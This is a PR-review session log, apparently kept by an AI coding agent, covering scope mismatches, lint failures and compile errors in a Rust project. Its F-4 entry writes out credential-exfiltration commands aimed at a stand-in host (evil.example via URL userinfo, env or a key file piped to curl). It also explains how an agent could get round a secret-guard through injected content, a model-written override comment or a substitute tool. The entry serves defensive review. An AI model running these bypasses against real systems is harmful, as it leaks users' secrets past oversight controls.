---
id: fee90da3055f3e19
kind: tracker
status: draft
title: Session Log — PR Review
tags:
- reconnaissance
- pr-review
- session-log
topic: pr-review
---

# Session Log — PR Review

> Two-sided observation log for the "review open PRs" work stream (PRs #7,
> #8, and #9 against `experiments`). Captures frictions (F-N) and wins (W-N)
> from reconnaissance performed while reviewing.

---

## Index

| ID | Date | Severity | Category | Status | Title |
|----|------|---------:|----------|--------|-------|
| F-1 | 2026-07-20 | low | plan-prose | open | PR #7 cites a bug file that doesn't exist anywhere in the repo |
| F-2 | 2026-07-20 | high | plan-prose | open | PR #8's description covers ~4 items; diff silently includes a 627-line indexer.rs rewrite + 2 more undisclosed fixes |
| F-3 | 2026-07-20 | med | codescout-tool | fixed-verified | Initial PR #7 review declared "no blocking correctness issues"; independent clippy run found one |
| F-4 | 2026-08-07 | high | plan-prose | open | PR #9 discloses two narrow limitations; 10 of 11 adversarial variants bypass the control, none of them via a disclosed route |
| F-5 | 2026-08-11 | high | plan-code | open | PR #13's plan called fastembed's `embed()` with `&self`; the same workspace already documents it as `&mut self`, and no lane the PR ran compiles the file |
| F-6 | 2026-08-11 | med | plan-prose | open | PR #13's summary claims `semantic_search`/`memory(recall)` work sidecar-free; nothing in the diff constructs the embedder (plan Tasks 4-6 absent) |

## Wins Index

| ID | Date | Impact | Pattern | Counterfactual | Status |
|----|------|-------:|---------|----------------|--------|
| W-1 | 2026-07-20 | high | Diff PR's claimed file list against `gh`'s actual file list before reading hunks | Would likely have missed or badly delayed the scope-mismatch finding (F-2) by reading hunks in file order instead | validated |
| W-2 | 2026-07-20 | high | Independent fmt/clippy/test run in an isolated worktree, not trusting PR self-reports | Would have pushed a broken `clippy -D warnings` gate onto `experiments` | validated |
| W-3 | 2026-08-07 | high | Execute a newly-added security control against adversarial inputs instead of reading its patterns | Would have shipped ~2 confident findings and hedged the rest, deferring to the PR's own stated scope | validated |
| W-4 | 2026-08-11 | high | On a third-party-API compile error, grep the whole workspace for an existing in-repo user of that type before designing the fix | Both reflex fixes (`&mut self` on the trait; `#[derive(Debug)]`) are impossible, and each costs a full `--features local-embed-dynamic` build to disprove | validated |

---

## F-1 — PR #7 cites a bug file that doesn't exist anywhere in the repo

**Observed:** 2026-07-20, reviewing PR #7 (`fix-embedder-connect-error`) via the `/review` skill.

**When:** Verifying the PR's claimed bug-fix cross-reference before writing up the review.

**Expected:** PR body + commit message cite `docs/issues/2026-07-13-semantic-search-misleading-stack-error-on-missing-env.md` as the bug being fixed — implying the file exists somewhere in the repo (open, to be archived after merge, per this project's bug-tracking convention).

**Got:** `git log --all --oneline -- '*misleading-stack-error*'` returned nothing; a filesystem search for `*misleading*` under `docs/issues/` also returned nothing. The cited bug file does not exist on any branch, tracked or untracked.

**Probable cause:** The PR was authored citing a path as if the "capture on notice" step (CLAUDE.md bug-tracking convention) had already happened, but the file was never created.

**Workaround:** Flagged in the review as a required fix before merge; no code workaround needed.

**Severity:** low — no tool call failed, nothing cascaded into other work. The cost is to this project's own bug-tracking hygiene: a "fix" with no filed bug leaves no paper trail to later archive.

**Status:** open

**Fix idea / Pointer:** PR #7 (`github.com/mareurs/codescout/pull/7`) should add the missing `docs/issues/*.md` file before merge, or correct the citation to the real path if one exists under a different name.

---

## F-2 — PR #8's description covers ~4 items; diff silently includes a 627-line indexer.rs rewrite + 2 more undisclosed fixes

**Observed:** 2026-07-20, reviewing PR #8 (`fix/symbols-overview-lsp-test-grep-glob-fixes`) via the `/review` skill.

**When:** Cross-checking `gh pr view 8 --json files` (actual changed-file list) against `gh pr view 8 --json body` (the PR's own description), before deep-diving individual diff hunks.

**Expected:** PR body describes exactly four categories of change (symbols `include_body`, Windows LSP test, grep glob tests, `edit_markdown` CRLF fallback) plus a vague "docs: add previously-untracked historical issue reports" bullet — implying the non-doc production changes are narrowly scoped to two tool files.

**Got:** the diff also rewrites `src/librarian/indexer.rs` (+627/−42): a real orphan-cleanup data-loss fix (catalog rows for still-existing, merely-ignored files were being deleted) PLUS two new features (`force_include` config knob, `force_embed`/`reembed` backfill flag) PLUS an opt-in, cross-project `artifact_vec` table drop-and-rebuild migration path — none named anywhere in the PR body. It also adds a second, independent CRLF-tolerant-match implementation in `src/tools/edit_file/mod.rs` (+97, for non-markdown files) with no corresponding `docs/issues` file, plus Windows path-normalization fixes in `src/agent/mod.rs` and `src/tools/config/mod.rs`. All of this is silently folded under the one vague "docs" bullet.

**Probable cause:** The PR body was written to describe the work as the author understood it at some earlier point in the branch's life and was never updated to reflect everything actually staged into it by the time the PR was opened.

**Workaround:** Read every changed file's diff independently rather than trusting the PR body's implied file-scope; called this out explicitly as the top finding in the review.

**Severity:** high — a reviewer (human or agent) trusting the PR body alone would approve a change with far more risk (core catalog-deletion logic, a destructive-but-opt-in shared-table migration) than advertised. Matches the rubric's "wrong code merged... hidden state change" case.

**Status:** open

**Fix idea / Pointer:** PR #8 (`github.com/mareurs/codescout/pull/8`) — update the PR description to name the indexer.rs orphan-cleanup fix, the `force_include`/`reembed` features, the `artifact_vec` migration path, and the separate `edit_file` CRLF fix, each with its own bug-file reference where one doesn't already exist.

---

## W-1 — Diffing PR's claimed file list against its actual file list caught the scope-mismatch before a hunk-by-hunk read

**Observed:** 2026-07-20, start of PR #8 review, before reading any diff hunk.

**Pattern:** Before reading a large PR's diff hunk-by-hunk, first run `gh pr view <n> --json files -q '.files[].path'` and `gh pr view <n> --json body -q .body`, and compare the raw file list against what the PR description claims to touch. A mismatch is cheap to spot at that level and expensive to notice by reading hunks in file order.

**Counterfactual:** Without this check, the review would likely have read files in diff order, treated `indexer.rs` as "just the next file in a big batch," and either missed connecting its 627-line rewrite to a scope-disclosure problem, or run out of attention/budget partway through before reaching that conclusion. The eventual finding (F-2) became the single most important point in the whole review; it was only caught because the file-list comparison happened *first*, before any hunk was read.

**Confirming data points:**
1. This session, PR #8 — comparing `gh pr view 8 --json files` against the PR body immediately surfaced 6 unmentioned files (`indexer.rs`, `edit_file/mod.rs`, `edit_file/tests.rs`, `agent/mod.rs`, `config/project.rs`, `tools/config/mod.rs`+tests) before any diff was read.
2. Pending — a second PR review (any project) that repeats this check before hunk-reading would confirm the pattern generalizes.

**Impact:** high — directly produced the review's top finding (F-2) and reframed the entire review's risk assessment.

**Promote-when:** A second PR review where this same "file-list-first" check catches an undisclosed-scope PR before deep-diving. At 2 datapoints, promote into the `/review` skill's own instructions as a required first step: "before reading diff hunks, diff the PR's claimed file list against `gh`'s actual file list."

**Status:** validated

---

## Status vocabulary

See `docs/templates/session-log.md` for the canonical definitions of the
Status columns used above (`open`, `mitigated`, `fixed-verified`,
`promoted-to-bug-tracker`, `pinned-as-eval-baseline` for frictions;
`validated`, `promoted-to-permanent-docs`, `archived` for wins).

## F-3 — Initial PR #7 review declared "no blocking correctness issues"; independent clippy run found one

**Observed:** 2026-07-20, merging PR #7 + PR #8 into `experiments` after the earlier `/review` pass.

**When:** Running `cargo clippy --all-targets -- -D warnings` on the merged worktree, as a verification step before pushing — not part of the original review.

**Expected:** The earlier review of PR #7 (this same session) concluded the diff was "solid, narrowly-scoped, well-tested" with no correctness-blocking issues — only a process/hygiene gap (missing bug file).

**Got:** `clippy::items_after_test_module` fired on `src/retrieval/embedder.rs`: PR #7's new `#[cfg(test)] mod tests { ... }` block was inserted between the `DenseEmbedder` trait and the `HttpDenseEmbedder` struct/impl — production items after a test module, denied under `-D warnings`. This was visible in the original diff hunk (I read it) but I evaluated the test's *logic* and never asked "would this specific placement pass clippy." The PR body's own claim ("cargo clippy -- -D warnings: clean") only covered PR #8, not PR #7 — PR #7's body made no such claim at all, which should have been the signal to verify it independently rather than infer it was fine.

**Probable cause:** Code review evaluated logic and test correctness but did not simulate the lint gate the diff would actually be pushed through. Reading a diff hunk is not the same as running the tool that gates it.

**Workaround:** Fixed directly during merge — relocated the test module to the end of the file (`edit_code` remove + replace) and ran `cargo fmt`. Re-verified clippy clean afterward.

**Severity:** med — would have caused a failed `cargo clippy -D warnings` gate for the next person working on `experiments` (or CI, if one existed); contained to one file, one fix, no cascade.

**Status:** fixed-verified — fix landed in commit `8389e0b4` (merged to `experiments` at `bb693446`), clippy confirmed clean after.

**Fix idea / Pointer:** For future PR reviews, don't rely on a PR body's self-reported `cargo fmt`/`clippy`/`test` claim without either (a) independently running those commands on the branch, or (b) explicitly flagging in the review when the PR body makes NO such claim at all (silence isn't evidence either way).

---

## W-2 — Independent clippy/fmt/test run (not trusting PR self-reports) caught a real merge-blocking bug

**Observed:** 2026-07-20, same merge session as F-3.

**Pattern:** Before pushing a merge of externally-authored PRs to a shared branch, build the merge in an isolated worktree and independently run `cargo fmt --check` / `cargo clippy --all-targets -- -D warnings` / `cargo test --lib` — even when a PR body claims these already passed. A claim about a different commit (the PR's own branch tip) does not cover what the branch looks like after merging alongside a sibling PR, or catch what the PR body simply never asserted.

**Counterfactual:** Without this check, `gh pr merge` on both PRs (trusting PR #8's "all green" self-report and PR #7's silence on the topic) would have landed `clippy::items_after_test_module` directly on `experiments` — breaking the `cargo clippy -D warnings` pre-commit gate for the next contributor, discovered only when someone else's unrelated work failed to commit.

**Confirming data points:**
1. This session — F-3, caught before push, zero blast radius.
2. Pending — a second merge session where this same independent-verification step catches a self-report gap.

**Impact:** high — prevented landing a broken lint gate on the shared integration branch.

**Promote-when:** A second PR-merge session where independent fmt/clippy/test verification (not trusting the PR body) catches a real gap. At 2 datapoints, promote to this project's RELEASE.md / Standard Ship Sequence as a required step for any multi-PR merge, not just cherry-picks to `master`.

**Status:** validated

---
## F-4 — PR #9's "honest limitations" disclose two narrow gaps; 10 of 11 adversarial variants bypass the control, none via a disclosed route

**Observed:** 2026-08-07, reviewing PR #9 (`feat/pi-secret-guard`) — `contrib/pi/secret-guard.ts`, a hard gate meant to block credential exfiltration through shell egress.

**When:** After reading the extension's source and running its 12-case suite (12/12 passing), before writing the review up.

**Expected:** The PR is unusually well-disclosed — it ships a "Scope (honest limitations)" paragraph in both the module docstring and the README, naming what is out of scope: "exfiltration through a legitimately allowed host, or obfuscated encodings of the secret." That framing implies the undisclosed cases are covered.

**Got:** An adversarial probe driving the extension's own `tool_call` handler (same fixture setup as the PR's suite) allowed **10 of 11 exfiltration variants** and blocked 2 benign local commands. None of the 10 route through an allowlisted host and none obfuscate the secret — i.e. none fall under either disclosed limitation:

- **URL userinfo confusion.** `SCHEMED_HOST = /https?:\/\/([A-Za-z0-9.-]+)/` stops at `@`, so it reports the *username* as the host. `curl "https://github.com@evil.example/?k=$KEY"` presents an allowlisted name to the guard while curl connects to `evil.example`.
- **`mentionsAllowed` is a disjunctive escape.** The block condition is `badHosts.length > 0 || !mentionsAllowed`, where `mentionsAllowed` is `allowedHosts.some(h => command.includes(h))` over the whole command string. Because it is OR'd in as an escape it can only ever convert a block into an allow — it never adds protection. A scheme-less destination (`curl evil.example/c`, which curl accepts) plus the literal string `localhost` anywhere — a comment, a `-A` flag, an earlier chained command — walks through.
- **The secret need not appear in the command.** `env | curl …` and `cat ~/.pi/agent/models.json | curl …` fail both trigger tests (no literal secret, no `*KEY|TOKEN|SECRET*` token), so the guard returns early at `secret-guard.ts:123-125`. The second exfiltrates the exact file the guard harvests its own secrets from.
- **The override is model-emitted.** `# secret-guard-override` is tested against the command string the model writes. The PR's own premise is that AGENTS.md rules are soft *because they live in the model's context and can be talked around by injected content* — the override lives there too, so the hard gate's bypass is enforced only by the soft guard it was built to replace. The `# codescout-override` convention it mirrors gates a tool-preference nudge, where the cost of bypass is `cat` instead of `read_file`.
- **Tool substitution.** The handler filters `event.toolName !== "bash"`, but `contrib/pi/mcp.json.example` (same directory) registers codescout's `run_command` as a directTool, and codescout's own `is_dangerous_command` (`src/util/path_security.rs:539`) matches only destructive patterns (`rm -rf`, `dd`, `mkfs`, `git push --force`) — no egress. Identical payload, ungated end to end, against the very keys that file holds.

Plus 2 false positives: `EGRESS` matches `\bnc\b` and `\bssh\b` as bare words, so `grep -nc "API_KEY" .env` and `grep API_KEY ~/.ssh/config` are both blocked as network egress.

**Probable cause:** The control decides safety by regex over the command *as text*, while what determines where bytes go is curl's URL parser and the shell. Every gap between the two is a bypass. The suite has exactly one payload shape per mechanism and no adversarial variants, so nothing in the PR's own verification could surface the class; the limitations paragraph was written from the author's model of the design rather than from an attempt to break it.

**Notable — a vacuous test hid the largest gap.** The suite's `"allow: non-bash tool calls are ignored"` case returns `undefined` without ever invoking `handlers.tool_call` (`tests/test-secret-guard.mjs:69-71`), so it cannot fail. It reads as coverage of the tool surface while proving nothing — and encodes the tool-substitution gap as *intended* behavior.

**Notable — the repo already wrote this lesson down.** `contrib/pi/codescout-mode.ts:13-17` carries the pi-integration F-3 post-mortem: MCP tools register *prefixed* (`codescout_run_command`, not `run_command`), and an earlier revision that assumed unprefixed names "silently no-op'd every session — native edit/write/read/bash were never blocked." `secret-guard.ts` hardcodes one unprefixed tool name in the same directory and inherits the same class of failure.

**Workaround:** Wrote an adversarial probe (see W-3) rather than reasoning about the regexes; reported every finding on the PR with the reproduction output attached. Recommended inverting the trigger to "any egress utility → every *parsed* destination must be allowlisted, fail closed," which closes the host-detection and secret-detection classes together without the control needing to recognize a secret at all.

**Severity:** high — a reviewer trusting the PR body's unusually candid disclosure would merge a security control that fails against its own stated threat model. The failure mode is worse than no control: `contrib/pi/AGENTS.md` is amended in the same PR to tell the agent the gate exists, which invites relying on it.

**Status:** open — reported on PR #9, not yet fixed.

**Fix idea / Pointer:** PR #9 (`github.com/mareurs/codescout/pull/9`). Ordering matters: fix the false positives *before* hardening the override, or the extension becomes annoying enough to uninstall — and habitual overriding is itself the bypass. The probe cases are reproducible and would drop into `contrib/pi/tests/test-secret-guard.mjs` nearly as-is, giving each fix a failing test to turn green.

---

## W-3 — Executing a security control against adversarial inputs (not reading its patterns) turned "probably has gaps" into 10 reproduced bypasses

**Observed:** 2026-08-07, reviewing PR #9 (`feat/pi-secret-guard`).

**Pattern:** When a PR adds a security or policy control — a guard, validator, allowlist, sanitizer — do not review it by reading its patterns. Stand up its own test fixture, import the module, and drive its decision function with a list of adversarial inputs, one per hypothesis, **plus a control case that must still trigger**. Report the run output rather than the reasoning. The control case is what distinguishes "the guard has holes" from "my harness isn't wired up."

**Counterfactual:** Reading `secret-guard.ts`'s five regexes produced roughly six bypass hypotheses. Source-reading alone would plausibly have shipped two of them as confident findings and hedged or dropped the rest — several (`env | curl`, `cat models.json | curl`, chained scheme-less egress) *look* at a glance like they might fall under the PR's disclosed "not a sandbox" limitation, and the pull is to defer to a stated scope rather than test it. Executing removed the ambiguity: 10 confirmed bypasses, 2 confirmed false positives, one control case blocking correctly. The single most important structural finding — tool substitution via `run_command` — only became concrete after checking what the sibling `mcp.json.example` actually registers and confirming codescout's `is_dangerous_command` carries no egress patterns; that is a three-file chain no amount of staring at the regexes would have produced.

**Confirming data points:**
1. This session, PR #9 — 10 bypasses + 2 false positives reproduced in a single probe run, against code whose own 12-case suite passed 12/12.
2. Pending — a second PR adding a guard/validator where execution surfaces a gap that source-reading rationalized away.

**Impact:** high — the difference between "this control has some gaps" (soft, arguable, easy for an author to wave off) and a paste-able run log naming the exact commands that walk through it.

**Promote-when:** A second PR review where executing a newly-added control against adversarial inputs surfaces a bypass that reading it did not. At 2 datapoints, promote to CLAUDE.md / the review skill as a required step for any PR adding a security or policy control. Sibling to W-2 ("independently run the gate, don't trust PR self-reports") — both are the same law: **execute the thing, don't infer from its description.**

**Status:** validated

---
## F-5 — PR #13's plan called fastembed's `embed()` with `&self`; the same workspace already documents it as `&mut self`

**Observed:** 2026-08-11, reviewing open PRs. PR #13 (`feat/local-onnx-embedder`)
shows 16 green checks and one red: `Feature check (opt-in build configs)`.

**When:** Reading the failing job log (run 31377316509) before proposing any fix.

**Expected (plan + branch code):**
`docs/superpowers/plans/2026-08-08-local-onnx-embedder.md:403` specifies
`fn embed_texts(&self, texts: Vec<String>)` calling `self.model.embed(texts, None)`.
`src/retrieval/local_onnx.rs:81` transcribes it verbatim.

**Got (scouted reality):** `fastembed-5.13.4/src/text_embedding/impl.rs:447` —
`pub fn embed<S>(&mut self, …)`. `cargo check --features local-embed-dynamic
--all-targets` fails E0596. The answer was already in this workspace, in a
comment: `crates/codescout-embed/src/local.rs:13` holds
`Arc<Mutex<fastembed::TextEmbedding>>` and line 82 reads *"fastembed 5 changed
embed() to &mut self — Mutex serializes access across spawn_blocking tasks"*.
Second error, same file: `local_onnx.rs:153` uses `.unwrap_err()`, which needs
`Self: Debug` — and `TextEmbedding` (`init.rs:127`) has no `Debug` impl, so the
reflex `#[derive(Debug)]` cannot compile either.

**Probable cause:** two independent gaps, both at the plan stage.
(a) The plan was written without grepping the workspace for existing users of
the same third-party type — one `grep TextEmbedding crates/` away.
(b) `src/retrieval/mod.rs:11` gates the module on `local-embed-dynamic` alone.
No CI *test* lane and no command in the PR's own 5-line test plan enables it;
only `cargo check --features local-embed-dynamic --all-targets`
(`.github/workflows/ci.yml:157`) compiles the file at all. The author did attempt
that exact command locally — `docs/issues/2026-08-08-cyberark-epm-blocks-ort-sys-build-script.md`
records it dying inside `ort-sys`'s build script (`os error 5`, CyberArk EPM)
before ever reaching codescout's own crate. So the file had been compiled
nowhere before CI.

**Severity:** high — the branch does not compile under the one feature that
reaches its new module, while the PR body reports 5 green commands and 3396
passing tests, none of which touched it.

**Status:** open

**Fix idea:** mirror `codescout-embed`'s shape — `model: Arc<Mutex<TextEmbedding>>`
plus `tokio::task::spawn_blocking` per call. That keeps the `&self` signature
`BatchEmbedder`/`CodeEmbedder` require (`src/retrieval/embedder.rs:26,41`) and
keeps CPU-bound ONNX inference off the async executor, which the plan never
addressed. Replace `.unwrap_err()` with `let Err(e) = … else { panic!() }`. Add
`--features local-embed-dynamic` to the branch's own verify list.

## F-6 — PR #13's summary claims an outcome its diff cannot produce: nothing constructs the embedder

**Observed:** 2026-08-11, same review pass.

**When:** Checking whether the new type is reachable, after the compile errors.

**Expected (PR body):** "Adds an in-process ONNX embedder … so `semantic_search`
and `memory(recall)` work without a remote embedder sidecar."

**Got:** `git grep LocalOnnxEmbedder origin/feat/local-onnx-embedder` finds the
type constructed only inside its own `#[cfg(test)]` module. The plan's Task 4
(*Selection via `CODESCOUT_EMBEDDER_MODEL`*, plan line 551) is absent; the sole
`CODESCOUT_EMBEDDER_MODEL` hit anywhere in `src/` is the pre-existing
`CODESCOUT_EMBEDDER_MODEL_NAME` at `src/retrieval/embedder.rs:246`. Tasks 5
(honest `workspace(status)`) and 6 (migration runbook) are absent too. The
branch delivers Tasks 1-3 of 6.

**Probable cause:** PR opened at a task boundary; the body was written from the
plan's goal statement rather than from the diff.

**Severity:** med — the compile errors block merge regardless, but merged as-is
the branch ships a type nothing constructs, plus `dep:fastembed` and an
ONNX-binary download added to the `local-embed` feature (`Cargo.toml:206`) that
compiles no user of it, since `mod.rs:11` gates the module on
`local-embed-dynamic` only.

**Status:** open

**Fix idea:** land Task 4 on the branch, or retitle the PR to what it delivers
("`CodeEmbedder` trait object + `LocalOnnxEmbedder` type; selection follows").
Same class as F-2, mirrored: F-2 was diff ⊃ description, this is description ⊃ diff.

## W-4 — Grepping the workspace for an existing user of the same third-party type gave the fix shape and killed two wrong ones

**Observed:** 2026-08-11, after CI named two compile errors in PR #13's
`local_onnx.rs`, before writing any fix.

**Pattern:** When a compile error comes from a third-party API's
`&self`/`&mut self`/ownership shape, grep the whole workspace for existing users
of that type before designing the fix. `grep TextEmbedding crates/` →
`codescout-embed/src/local.rs`, a working in-repo solution to the identical
constraint, comment included.

**Counterfactual:** the two reflex fixes are both impossible, and each costs a
full `--features local-embed-dynamic` build to disprove (~28 s on CI's runner;
minutes locally once `ort` is in the graph).
1. Change `embed_texts` to `&mut self` — blocked: `BatchEmbedder` and
   `CodeEmbedder` declare `&self` (`src/retrieval/embedder.rs:26,41`) and
   `RetrievalClient.embedder` is `Arc<dyn CodeEmbedder>`, so the change would
   have to propagate through the trait, the `Arc`, and both `EmbedderHttp` impls.
2. `#[derive(Debug)]` for the E0277 — blocked: `TextEmbedding`
   (`fastembed-5.13.4/src/text_embedding/init.rs:127`) has no `Debug` impl, so
   the derive fails on the field it wraps.
The scout produced the one shape that satisfies both (`Arc<Mutex<…>>` +
`spawn_blocking`) and, unprompted, the executor-blocking answer the plan omitted.

**Confirming data points:**
1. This session — two candidate fixes eliminated by reading one sibling file.
2. Kin: R-17 (spot-check sibling callers of a just-fixed shared helper).

**Impact:** high — replaces two build-and-fail cycles on the slowest-to-compile
feature config with one grep.

**Promote-when:** a second case where in-repo prior art for a third-party API
decides a fix shape. At 2 datapoints, promote to the reconnaissance skill's
Phase 1 as "grep the workspace for existing users of a third-party type before
writing code that calls it."

**Status:** validated

## Template for new entries

<!-- Insert new F-N / W-N entries above this line via:
     artifact(action="update", id=<this artifact's id>,
              patch={body_edits: [{heading: "## Template for new entries",
                                    action: "insert_before",
                                    content: "## F-N — title\n..."}]})
     Also update the matching Index / Wins Index table row at the top. -->
